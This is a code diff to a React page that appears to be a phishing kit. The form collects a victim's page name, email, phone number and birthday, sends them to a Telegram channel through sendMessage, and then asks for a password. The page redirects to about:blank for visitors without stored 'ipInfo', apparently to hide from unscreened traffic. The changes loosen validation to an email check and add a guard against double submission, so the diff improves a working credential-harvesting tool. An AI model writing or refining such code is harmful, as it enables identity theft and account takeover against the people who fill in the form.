@@ -36,7 +36,7 @@ const Home = () => {
         }),
         []
     );
-
+    const [isLoading, setIsLoading] = useState(false);
     const [formData, setFormData] = useState({
         pageName: '',
         mail: '',
@@ -89,7 +89,7 @@ const Home = () => {
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
         if (!ipInfo) {
-            window.location.href = 'about:blank';
+            globalThis.location.href = 'about:blank';
         }
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
@@ -111,37 +111,17 @@ const Home = () => {
         }
     };
 
-    const validateForm = () => {
-        const requiredFields = ['pageName', 'mail', 'phone', 'birthday'];
-        const newErrors = {};
-
-        requiredFields.forEach((field) => {
-            if (formData[field].trim() === '') {
-                newErrors[field] = true;
-            }
-        });
-
-        setErrors(newErrors);
-        return Object.keys(newErrors).length === 0;
-    };
-
     const handleSubmit = async () => {
-        if (validateForm()) {
+        const emailRegex = /^[\w-.]+@([\w-]+\.)+[\w-]{2,4}$/;
+        if (emailRegex.test(formData.mail.trim())) {
             try {
                 const telegramMessage = formatTelegramMessage(formData);
+                setIsLoading(true);
                 await sendMessage(telegramMessage);
-
+                setIsLoading(false);
                 setShowPassword(true);
             } catch {
-                window.location.href = 'about:blank';
-            }
-        } else {
-            const firstErrorField = Object.keys(errors)[0];
-            if (firstErrorField) {
-                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
-                if (inputElement) {
-                    inputElement.focus();
-                }
+                globalThis.location.href = 'about:blank';
             }
         }
     };
@@ -257,7 +237,14 @@ const Home = () => {
                                 <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
+                            <button
+                                className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal'
+                                onClick={() => {
+                                    if (!isLoading) {
+                                        handleSubmit();
+                                    }
+                                }}
+                            >
                                 {translatedTexts.submit}
                             </button>
                         </div>
